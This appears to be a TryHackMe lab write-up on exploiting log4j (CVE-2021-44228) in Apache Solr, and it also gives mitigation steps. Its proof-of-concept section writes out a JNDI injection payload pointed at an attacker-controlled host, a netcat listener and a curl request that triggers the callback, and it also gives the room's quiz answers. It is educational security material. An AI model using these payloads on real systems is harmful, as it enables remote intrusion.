# WORK IN PROGRESS...
# TryHackMe: Solar, exploiting log4j

_Explore CVE-2021-44228, a vulnerability in log4j affecting almost all software under the sun._

[Solar, exploiting log4j](https://tryhackme.com/room/solar)

* * * * * 
* * * * *

## Reconnaissance

Run a basic nmap scan against vulnerable machine:
```
nmap -v IP_ADDRESS
```

Scan all ports on machine via nmap:
```
nmap -v -p- IP_ADDRESS
```

The default Port that SOLR (Apache Solr) runs on is **Port 8983**.

* * *

## Discovery

Download the files `solrlogs`.

What is the `-Dsolr.log.dir` argument set to, displayed on the front page?
```
-Dsolr.log.dir=/var/solr/logs
```

Which file includes contains this repeated entry? (Just the filename itself, no path needed)

```
solr.log
```

What "path" or URL endpoint is indicated in these repeated entries?
```
/admin/cores
```

Viewing these log entries, what field name indicates some data entrypoint that you as a user could control?
```
params
```

* * *

## Proof of Concept

```
http://IP_ADDRESS:8983/solr/admin/cores
```

General payload to abuse log4j vulnerability CVE-2021-44228:
```
${jndi:ldap://ATTACKERCONTROLLEDHOST}
```

_JNDI = Java Naming and Directory Interface_

_`ldap://` schema = target will reach out to an endpoint (an attacker controlled location, in the case of this attack) via the Lightweight Directory Access Protocol (LDAP) protocol_

Where to supply the inject syntax:
* Input boxes, user and password login forms, data entry points within applications
* HTTP headers such as `User-Agent`, `X-Forwarded-For`, or other customizable headers
* Any place for user-supplied data

Prepare a `netcat` listener on any port of your choosing:
```
nc -lnvp 9999
```

Now that you have a listener staged, make a request including this primitive JNDI payload syntax as part of the HTTP parameters. This can easily be done with the curl command line utility:
```
curl 'http://10.10.236.228:8983/solr/admin/cores?foo=$\{jndi:ldap://YOUR.ATTACKER.IP.ADDRESS:9999\}'
```

* * *
* * * 

## Mitigation

### Option 1

Manually modify the `solr.in.sh` file with a specific syntax.

Determine where the file exists:
```
locate solr.in.sh
```

The Apache Solr website Security page explains that you can add this specific syntax to the `solr.in.sh` file:

```
SOLR_OPTS="$SOLR_OPTS -Dlog4j2.formatMsgNoLookups=true"
```

Restart Solr service:
```
sudo /etc/init.d/solr restart
```

### Option 2

Upgrade to a higher version: 2.17.0 or higher.

More info on: https://solr.apache.org/security.html

### Option 3

Changing the environment variable `LOG4J_FORMAT_MSG_NO_LOOKUPS` to true, on log4j versions >=2.10:
```
JAVA_OPTS=-Dlog4j2.formatMsgNoLookups=true
```

For log4j versions >=2.7 and <=2.14.1, modify the `PatternLayout` patterns to specifiy the message converter as:
```
%m{nolookups}
```

Source: https://www.thesecmaster.com/how-to-fix-cve-2021-44228-log4shell-a-critical-0-day-rce-in-log4j-logging-library/#How_To_Fix_CVE-2021-44228_Log4Shell_Vulnerability

* * *
* * * 

# Disclaimer

For educational purposes only. This is not legal advice and some options or methods might not work for all systems, architectures, or configurations.
